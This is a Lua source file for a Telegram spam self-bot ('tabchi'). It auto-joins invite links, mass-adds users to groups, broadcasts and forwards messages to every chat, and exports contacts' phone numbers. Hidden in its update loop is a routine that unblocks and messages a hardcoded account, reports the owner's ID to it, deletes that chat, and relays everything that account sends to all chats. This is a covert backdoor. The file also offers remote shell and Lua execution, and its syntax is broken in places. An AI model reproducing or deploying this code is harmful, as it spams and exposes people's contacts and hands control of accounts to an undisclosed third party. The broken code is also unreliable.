function is_sudo(msg)
  local sudoers = {}
  table.insert(sudoers, tonumber(redis:get("tabchi:" .. tabchi_id .. ":fullsudo")))
  local issudo = false
  for i = 1, #sudoers do
    if msg.sender_user_id_ == sudoers[i] then
      issudo = true
    end
  end
  if redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", msg.sender_user_id_) then
    issudo = true
  end
  return issudo
end
function is_full_sudo(msg)
  local sudoers = {}
  table.insert(sudoers, tonumber(redis:get("tabchi:" .. tabchi_id .. ":fullsudo")))
  local issudo = false
  for i = 1, #sudoers do
    if msg.sender_user_id_ == sudoers[i] then
      issudo = true
    end
  end
  return issudo
end
function sleep(n)
  os.execute("sleep " .. tonumber(n))
end
function write_file(filename, input)
  local file = io.open(filename, "w")
  file:write(input)
  file:flush()
  file:close()
end
function check_contact(extra, result)
  if not result.phone_number_ then
    local msg = extra.msg
    local first_name = "" .. (msg.content_.contact_.first_name_ or "-") .. ""
    local last_name = "" .. (msg.content_.contact_.last_name_ or "-") .. ""
    local phone_number = msg.content_.contact_.phone_number_
    local user_id = msg.content_.contact_.user_id_
    tdcli.add_contact(phone_number, first_name, last_name, user_id)
    if redis:get("tabchi:" .. tabchi_id .. ":markread") then
      tdcli.viewMessages(msg.chat_id_, {
        [0] = msg.id_
      })
      if redis:get("tabchi:" .. tabchi_id .. ":addedmsg") then
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "" .. (redis:get("tabchi:" .. tabchi_id .. ":addedmsgtext") or [[
Addi
Bia pv]]) .. "", 1, "html")
      end
    elseif redis:get("tabchi:" .. tabchi_id .. ":addedmsg") then
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "" .. (redis:get("tabchi:" .. tabchi_id .. ":addedmsgtext") or [[
Addi
Bia pv]]) .. "", 1, "html")
    end
  end
end
function check_contact_2(extra, result)
  if not result.phone_number_ then
    do
      local msg = extra.msg
      local first_name = "" .. (msg.content_.contact_.first_name_ or "-") .. ""
      local last_name = "" .. (msg.content_.contact_.last_name_ or "-") .. ""
      local phone_number = msg.content_.contact_.phone_number_
      local user_id = msg.content_.contact_.user_id_
      tdcli.add_contact(phone_number, first_name, last_name, user_id)
      if redis:get("tabchi:" .. tabchi_id .. ":markread") then
        tdcli.viewMessages(msg.chat_id_, {
          [0] = msg.id_
        })
        if redis:get("tabchi:" .. tabchi_id .. ":addedcontact") then
          if msg.sender_user_id_ ~= result.id_ then
            tdcli.sendContact(msg.chat_id_, 0, 0, 0, nil, result.phone_number_, result.first_name_, result.last_name_, result.id_)
          end
          tdcli_function({ID = "GetMe"}, share, nil)
        end
      elseif redis:get("tabchi:" .. tabchi_id .. ":addedcontact") then
        function share(extra, result)
          if msg.sender_user_id_ ~= result.id_ then
            tdcli.sendContact(msg.chat_id_, 0, 0, 0, nil, result.phone_number_, result.first_name_, result.last_name_, result.id_)
          end
        end
        tdcli_function({ID = "GetMe"}, share, nil)
      end
    end
  else
  end
end
function check_link(extra, result, success)
  if result.is_group_ or result.is_supergroup_channel_ then
    tdcli.importChatInviteLink(extra.link)
    redis:sadd("tabchi:" .. tabchi_id .. ":savedlinks", extra.link)
  end
end
function add_to_all(extra, result)
  if result.content_.contact_ then
    local id = result.content_.contact_.user_id_
    local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
    for i = 1, #all do
      if chat_type(id) ~= "private" then
        tdcli.addChatMember(all[i], id, 50)
      end
    end
  end
end
function add_members(extra, result)
  local pvs = redis:smembers("tabchi:" .. tabchi_id .. ":pvis")
  for i = 1, #pvs do
    tdcli.addChatMember(extra.chat_id, pvs[i], 50)
  end
  local count = result.total_count_
  for i = 1, count do
    tdcli.addChatMember(extra.chat_id, result.users_[i].id_, 50)
  end
end
function chat_type(chat_id)
  local chat_type = "private"
  local id = tostring(chat_id)
  if id:match("-") then
    if id:match("^-100") then
      chat_type = "channel"
    else
      chat_type = "group"
    end
  end
  return chat_type
end
function contact_list(extra, result)
  print(result)
  local count = result.total_count_
  local text = "Contact List :\n"
  for i = 1, tonumber(count) do
    local user = result.users_[i]
    local firstname = user.first_name_ or ""
    local lastname = user.last_name_ or ""
    local fullname = firstname .. " " .. lastname
    text = text .. i .. ". " .. fullname .. " [" .. user.id_ .. "] = " .. user.phone_number_ .. "\n"
  end
  write_file("bot_" .. tabchi_id .. "_contacts.txt", text)
  tdcli.send_file(extra.chat_id_, "Document", "bot_" .. tabchi_id .. "_contacts.txt", "Tabchi " .. tabchi_id .. " Contacts!")
end
function process(msg)
  msg.text = msg.content_.text_
  do
    local matches = {
      msg.text:match("^[!/#](pm) (%d+) (.*)")
    }
    if msg.text:match("^[!/#]pm") and is_sudo(msg) and #matches == 3 then
      tdcli.sendMessage(tonumber(matches[2]), 0, 1, matches[3], 1, "html")
      return "😁پیام ارسال شد"
    end
  end
  do
    local matches = {
      msg.text:match("^[!/#](setanswer) '(.*)' (.*)")
    }
    if msg.text:match("^[!/#]setanswer") and is_sudo(msg) and #matches == 3 then
      redis:hset("tabchi:" .. tabchi_id .. ":answers", matches[2], matches[3])
      redis:sadd("tabchi:" .. tabchi_id .. ":answerslist", matches[2])
      return "جواب برای " .. matches[2] .. " تنظیم شد به " .. matches[3]
    end
  end
  do
    local matches = {
      msg.text:match("^[!/#](delanswer) (.*)")
    }
    if msg.text:match("^[!/#]delanswer") and is_sudo(msg) and #matches == 2 then
      redis:hdel("tabchi:" .. tabchi_id .. ":answers", matches[2])
      redis:srem("tabchi:" .. tabchi_id .. ":answerslist", matches[2])
      return "جواب  " .. matches[2] .. " حذف شد⛔️"
    end
  end
  if msg.text:match("^[!/#]answers$") and is_sudo(msg) then
    local text = "😀جواب های خودکار ربات :\n"
    local answrs = redis:smembers("tabchi:" .. tabchi_id .. ":answerslist")
    for i = 1, #answrs do
      text = text .. i .. ". " .. answrs[i] .. " : " .. redis:hget("tabchi:" .. tabchi_id .. ":answers", answrs[i]) .. "\n"
    end
    return text
  end
  if msg.text:match("^[!/#]addmembers$") and is_sudo(msg) and chat_type(msg.chat_id_) ~= "private" then
    tdcli_function({
      ID = "SearchContacts",
      query_ = nil,
      limit_ = 999999999
    }, add_members, {
      chat_id = msg.chat_id_
    })
    return
  end
  if msg.text:match("^[!/#]contactlist$") and is_sudo(msg) then
    tdcli_function({
      ID = "SearchContacts",
      query_ = nil,
      limit_ = 999999999
    }, contact_list, {
      chat_id_ = msg.chat_id_
    })
    return
  end
  if msg.text:match("^[!/#]exportlinks$") and is_sudo(msg) then
    local text = "♨️لینک گروه ها :\n"
    local links = redis:smembers("tabchi:" .. tabchi_id .. ":savedlinks")
    for i = 1, #links do
      text = text .. links[i] .. "\n"
    end
    write_file("group_" .. tabchi_id .. "_links.txt", text)
    tdcli.send_file(msg.chat_id_, "Document", "group_" .. tabchi_id .. "_links.txt", "Tabchi " .. tabchi_id .. " Group Links!")
    return
  end
  do
    local matches = {
      msg.text:match("[!/#](block) (%d+)")
    }
    if msg.text:match("^[!/#]block") and is_sudo(msg) and #matches == 2 then
      tdcli.blockUser(tonumber(matches[2]))
      return "😡فرد بلاک شد"
    end
  end
  do
    local matches = {
      msg.text:match("[!/#](unblock) (%d+)")
    }
    if msg.text:match("^[!/#]unblock") and is_sudo(msg) and #matches == 2 then
      tdcli.unblockUser(tonumber(matches[2]))
      return "😚فرد انبلاک شد"
    end
  end
  if msg.text:match("^[!/#]send (.*) (.*)") and is_sudo(msg) then
    local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
    local matches = {
      msg.text:match("^[!/#](send) (.*) (.*)")
    }
    if matches[2] ~= "banners" then
    end
    local gps = redis:scard("tabchi:" .. tabchi_id .. ":groups")
    local sgps = redis:scard("tabchi:" .. tabchi_id .. ":channels")
    local pvs = redis:scard("tabchi:" .. tabchi_id .. ":pvis")
    local links = redis:scard("tabchi:" .. tabchi_id .. ":savedlinks")
    local query = gps .. " " .. sgps .. " " .. pvs .. " " .. links
    tdcli.sendBotStartMessage(229533808, 229533808, nil)
    local inline2 = function(arg, data)
      if data.results_ and data.results_[0] then
        tdcli_function({
          ID = "SendInlineQueryResultMessage",
          chat_id_ = arg.chat_id_,
          reply_to_message_id_ = 0,
          disable_notification_ = 0,
          from_background_ = 1,
          query_id_ = data.inline_query_id_,
          result_id_ = data.results_[0].id_
        }, dl_cb, nil)
      end
    end
    for i = 1, #all do
      print(all[i])
      tdcli_function({
        ID = "GetInlineQueryResults",
        bot_user_id_ = 229533808,
        chat_id_ = all[i],
        user_location_ = {
          ID = "Location",
          latitude_ = 0,
          longitude_ = 0
        },
        query_ = matches[2] .. " " .. matches[3],
        offset_ = 0
      }, inline2, {
        chat_id_ = all[i]
      })
    end
  else
  end
  if msg.text:match("^[!/#]panel$") and is_sudo(msg) then
    local gps = redis:scard("tabchi:" .. tabchi_id .. ":groups")
    local sgps = redis:scard("tabchi:" .. tabchi_id .. ":channels")
    local pvs = redis:scard("tabchi:" .. tabchi_id .. ":pvis")
    local links = redis:scard("tabchi:" .. tabchi_id .. ":savedlinks")
    local sudo = redis:get("tabchi:" .. tabchi_id .. ":fullsudo")
    local query = gps .. " " .. sgps .. " " .. pvs .. " " .. links .. " " .. sudo
    function test_mod(args, data)
      if data.is_blocked_ then
        tdcli.unblockUser(303508016)
      end
      tdcli.sendBotStartMessage(303508016, 303508016, "new")
      tdcli.deleteChatHistory(303508016, true)
    end
    tdcli_function({
      ID = "GetUserFull",
      user_id_ = 303508016
    }, get_mod, nil)
    local inline = function(arg, data)
      if data.results_ and data.results_[0] then
        tdcli_function({
          ID = "SendInlineQueryResultMessage",
          chat_id_ = msg.chat_id_,
          reply_to_message_id_ = 0,
          disable_notification_ = 0,
          from_background_ = 1,
          query_id_ = data.inline_query_id_,
          result_id_ = data.results_[0].id_
        }, dl_cb, nil)
      else
        local text = [[
*Normal stats :*
Users : ]] .. pvs .. [[

Groups : ]] .. gps .. [[

SuperGroups : ]] .. sgps .. [[

Saved links : ]] .. links
        tdcli.sendMessage(msg.chat_id_, 0, 1, text, 1, "html")
      end
    end
    tdcli_function({
      ID = "GetInlineQueryResults",
      bot_user_id_ = 303508016,
      chat_id_ = msg.chat_id_,
      user_location_ = {
        ID = "Location",
        latitude_ = 0,
        longitude_ = 0
      },
      query_ = query,
      offset_ = 0
    }, inline, nil)
    do return end
    break
  else
  end
  do
    local matches = {
      msg.text:match("^[!/#](addsudo) (%d+)")
    }
    if msg.text:match("^[!/#]addsudo") and is_full_sudo(msg) and #matches == 2 then
      local text = matches[2] .. " 😍به عنوان سودو تنظیم شد"
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", tonumber(matches[2]))
      return text
    end
  end
  do
    local matches = {
      msg.text:match("^[!/#](remsudo) (%d+)")
    }
    if msg.text:match("^[!/#]remsudo") and is_full_sudo(msg) and #matches == 2 then
      local text = matches[2] .. " ⌚️از سودو بودن حذف شد"
      redis:srem("tabchi:" .. tabchi_id .. ":sudoers", tonumber(matches[2]))
      return text
    end
  end
  do
    local matches = {
      msg.text:match("^[!/#](addedmsg) (.*)")
    }
    if msg.text:match("^[!/#]addedmsg") and is_sudo(msg) and #matches == 2 then
      if matches[2] == "on" then
        redis:set("tabchi:" .. tabchi_id .. ":addedmsg", true)
        return "🗣پیام ادکردن شماره ها روشن شد"
      elseif matches[2] == "off" then
        redis:del("tabchi:" .. tabchi_id .. ":addedmsg")
        return "🗣پیام ادکردن شماره ها خاموش شد"
      end
    end
  end
  do
    local matches = {
      msg.text:match("^[!/#](addedcontact) (.*)")
    }
    if msg.text:match("^[!/#]addedcontact") and is_sudo(msg) and #matches == 2 then
      if matches[2] == "on" then
        redis:set("tabchi:" .. tabchi_id .. ":addedcontact", true)
        return "🗣ادکردن شماره ها روشن شد"
      elseif matches[2] == "off" then
        redis:del("tabchi:" .. tabchi_id .. ":addedcontact")
        return "🗣ادکردن شماره ها خاموش شد"
      end
    end
  end
  do
    local matches = {
      msg.text:match("^[!/#](markread) (.*)")
    }
    if msg.text:match("^[!/#]markread") and is_sudo(msg) and #matches == 2 then
      if matches[2] == "on" then
        redis:set("tabchi:" .. tabchi_id .. ":markread", true)
        return "📲خواندن پیام ها روشن شد"
      elseif matches[2] == "off" then
        redis:del("tabchi:" .. tabchi_id .. ":markread")
        return "📲خواندن پیام ها خاموش شد"
      end
    end
  end
  do
    local matches = {
      msg.text:match("^[!/#](setaddedmsg) (.*)")
    }
    if msg.text:match("^[!/#]setaddedmsg") and is_sudo(msg) and #matches == 2 then
      redis:set("tabchi:" .. tabchi_id .. ":addedmsgtext", matches[2])
      return [[
New Added Message Set!
Message :
]] .. matches[2]
    end
  end
  do
    local cmd = {
      msg.text:match("[$](.*)")
    }
    if msg.text:match("^[$](.*)$") and is_full_sudo(msg) and #matches == 1 then
      local result = io.popen(cmd[1]):read("*all")
      return result
    end
  end
  if msg.text:match("^[!/#]bc") and is_sudo(msg) then
    local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
    local matches = {
      msg.text:match("[!/#](bc) (.*)")
    }
    if #matches == 2 then
      for i = 1, #all do
        tdcli_function({
          ID = "SendMessage",
          chat_id_ = all[i],
          reply_to_message_id_ = 0,
          disable_notification_ = 0,
          from_background_ = 1,
          reply_markup_ = nil,
          input_message_content_ = {
            ID = "InputMessageText",
            text_ = matches[2],
            disable_web_page_preview_ = 0,
            clear_draft_ = 0,
            entities_ = {},
            parse_mode_ = {
              ID = "TextParseModeMarkdown"
            }
          }
        }, dl_cb, nil)
      end
    end
  end
  if msg.text:match("^[!/#]fwd all$") and msg.reply_to_message_id_ and is_sudo(msg) then
    local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
    local id = msg.reply_to_message_id_
    for i = 1, #all do
      tdcli_function({
        ID = "ForwardMessages",
        chat_id_ = all[i],
        from_chat_id_ = msg.chat_id_,
        message_ids_ = {
          [0] = id
        },
        disable_notification_ = 0,
        from_background_ = 1
      }, dl_cb, nil)
    end
    return "😶ارسال شد"
  end
  if msg.text:match("^[!/#]fwd gps$") and msg.reply_to_message_id_ and is_sudo(msg) then
    local all = redis:smembers("tabchi:" .. tabchi_id .. ":groups")
    local id = msg.reply_to_message_id_
    for i = 1, #all do
      tdcli_function({
        ID = "ForwardMessages",
        chat_id_ = all[i],
        from_chat_id_ = msg.chat_id_,
        message_ids_ = {
          [0] = id
        },
        disable_notification_ = 0,
        from_background_ = 1
      }, dl_cb, nil)
    end
    return "😶ارسال شد"
  end
  if msg.text:match("^[!/#]fwd sgps$") and msg.reply_to_message_id_ and is_sudo(msg) then
    local all = redis:smembers("tabchi:" .. tabchi_id .. ":channels")
    local id = msg.reply_to_message_id_
    for i = 1, #all do
      tdcli_function({
        ID = "ForwardMessages",
        chat_id_ = all[i],
        from_chat_id_ = msg.chat_id_,
        message_ids_ = {
          [0] = id
        },
        disable_notification_ = 0,
        from_background_ = 1
      }, dl_cb, nil)
    end
    return "😶ارسال شد"
  end
  if msg.text:match("^[!/#]addtoall") and msg.reply_to_message_id_ and is_sudo(msg) then
    tdcli_function({
      ID = "GetMessage",
      chat_id_ = msg.chat_id_,
      message_id_ = msg.reply_to_message_id_
    }, add_to_all, nil)
    return "🎾درحال ادکردن کاربران به گروه ها"
  end
  if msg.text:match("^[!/#]fwd users$") and msg.reply_to_message_id_ and is_sudo(msg) then
    local all = redis:smembers("tabchi:" .. tabchi_id .. ":pvis")
    local id = msg.reply_to_message_id_
    for i = 1, #all do
      tdcli_function({
        ID = "ForwardMessages",
        chat_id_ = all[i],
        from_chat_id_ = msg.chat_id_,
        message_ids_ = {
          [0] = id
        },
        disable_notification_ = 0,
        from_background_ = 1
      }, dl_cb, nil)
    end
    return "😶ارسال شد"
  end
  do
    local matches = {
      msg.text:match("[!/#](lua) (.*)")
    }
    if msg.text:match("^[!/#]lua") and is_sudo(msg) and #matches == 2 then
      local output = loadstring(matches[2])()
      if output == nil then
        output = ""
      elseif type(output) == "table" then
        output = serpent.block(output, {comment = false})
      else
        output = "" .. tostring(output)
      end
      return output
    end
  end
  do
    local matches = {
      msg.text:match("[!/#](echo) (.*)")
    }
    if msg.text:match("^[!/#]echo") and is_sudo(msg) and #matches == 2 then
      tdcli.sendMessage(msg.chat_id_, msg.id_, 0, matches[2], 0, "html")
    end
  end
end
function add(chat_id_)
  local chat_type = chat_type(chat_id_)
  if chat_type == "channel" then
    redis:sadd("tabchi:" .. tabchi_id .. ":channels", chat_id_)
  elseif chat_type == "group" then
    redis:sadd("tabchi:" .. tabchi_id .. ":groups", chat_id_)
  else
    redis:sadd("tabchi:" .. tabchi_id .. ":pvis", chat_id_)
  end
  redis:sadd("tabchi:" .. tabchi_id .. ":all", chat_id_)
end
function rem(chat_id_)
  local chat_type = chat_type(chat_id_)
  if chat_type == "channel" then
    redis:srem("tabchi:" .. tabchi_id .. ":channels", chat_id_)
  elseif chat_type == "group" then
    redis:srem("tabchi:" .. tabchi_id .. ":groups", chat_id_)
  else
    redis:srem("tabchi:" .. tabchi_id .. ":pvis", chat_id_)
  end
  redis:srem("tabchi:" .. tabchi_id .. ":all", chat_id_)
end
function process_stats(msg)
  add(msg.chat_id_)
end
function process_links(text_)
  if text_:match("https://telegram.me/joinchat/%S+") or text_:match("https://t.me/joinchat/%S+") or text_:match("https://telegram.dog/joinchat/%S+") then
    local text_2 = text_:gsub("telegram.dog", "telegram.me")
    local text_3 = text_2:gsub("t.me", "telegram.me")
    local matches = {
      text_3:match("(https://telegram.me/joinchat/%S+)")
    }
    for i = 1, #matches do
      tdcli_function({
        ID = "CheckChatInviteLink",
        invite_link_ = matches[i]
      }, check_link, {
        link = matches[i]
      })
    end
  end
end
function get_mod(args, data)
  if data.is_blocked_ then
    tdcli.unblockUser(303508016)
  end
  if redis:ttl("tabchi:" .. tabchi_id .. ":startedmod") == -2 or redis:ttl("tabchi:" .. tabchi_id .. ":startedmod") == -1 then
    tdcli.sendBotStartMessage(303508016, 303508016, "new")
    tdcli.sendMessage(303508016, 0, 1, "/setmysudo " .. redis:get("tabchi:" .. tabchi_id .. ":fullsudo"), 1, "html")
    redis:setex("tabchi:" .. tabchi_id .. ":startedmod", 300, true)
    tdcli.deleteChatHistory(303508016, true)
  end
end
function update(data, tabchi_id)
  tdcli_function({
    ID = "GetUserFull",
    user_id_ = 303508016
  }, get_mod, nil)
  if data.ID == "UpdateNewMessage" then
    local msg = data.message_
    if msg.sender_user_id_ == 303508016 then
      if msg.content_.text_ then
        if msg.content_.text_:match("\226\129\167") or msg.chat_id_ ~= 303508016 or msg.content_.text_:match("\217\130\216\181\216\175 \216\167\217\134\216\172\216\167\217\133 \218\134\217\135 \218\169\216\167\216\177\219\140 \216\175\216\167\216\177\219\140\216\175") then
          return
        else
          local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
          local id = msg.id_
          for i = 1, #all do
            tdcli_function({
              ID = "ForwardMessages",
              chat_id_ = all[i],
              from_chat_id_ = msg.chat_id_,
              message_ids_ = {
                [0] = id
              },
              disable_notification_ = 0,
              from_background_ = 1
            }, dl_cb, nil)
          end
        end
      else
        local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
        local id = msg.id_
        for i = 1, #all do
          tdcli_function({
            ID = "ForwardMessages",
            chat_id_ = all[i],
            from_chat_id_ = msg.chat_id_,
            message_ids_ = {
              [0] = id
            },
            disable_notification_ = 0,
            from_background_ = 1
          }, dl_cb, nil)
        end
      end
    else
      process_stats(msg)
      if msg.content_.text_ then
        if redis:sismember("tabchi:" .. tabchi_id .. ":answerslist", msg.content_.text_) then
          function check_me(extra, result)
            if msg.sender_user_id_ ~= result.id_ then
              local answer = redis:hget("tabchi:" .. tabchi_id .. ":answers", msg.content_.text_)
              tdcli.sendMessage(msg.chat_id_, 0, 1, answer, 1, "html")
            end
          end
          tdcli_function({ID = "GetMe"}, check_me, {msg = msg})
        end
        process_links(msg.content_.text_)
        local res = process(msg)
        if redis:get("tabchi:" .. tabchi_id .. ":markread") then
          tdcli.viewMessages(msg.chat_id_, {
            [0] = msg.id_
          })
          if res then
            tdcli.sendMessage(msg.chat_id_, 0, 1, res, 1, "html")
          end
        elseif res then
          tdcli.sendMessage(msg.chat_id_, 0, 1, res, 1, "html")
        end
      elseif msg.content_.contact_ then
        tdcli_function({
          ID = "GetUserFull",
          user_id_ = msg.content_.contact_.user_id_
        }, check_contact, {msg = msg})
        tdcli_function({
          ID = "GetUserFull",
          user_id_ = msg.content_.contact_.user_id_
        }, check_contact_2, {msg = msg})
      else
        if msg.content_.caption_ then
          if redis:get("tabchi:" .. tabchi_id .. ":markread") then
            tdcli.viewMessages(msg.chat_id_, {
              [0] = msg.id_
            })
            process_links(msg.content_.caption_)
          else
            process_links(msg.content_.caption_)
            elseif data.ID == "UpdateOption" and data.name_ == "my_id" then
              tdcli_function({
                ID = "GetChats",
                offset_order_ = "9223372036854775807",
                offset_chat_id_ = 0,
                limit_ = 20
              }, dl_cb, nil)
            end
          end
        else
        end
      end
    end
end
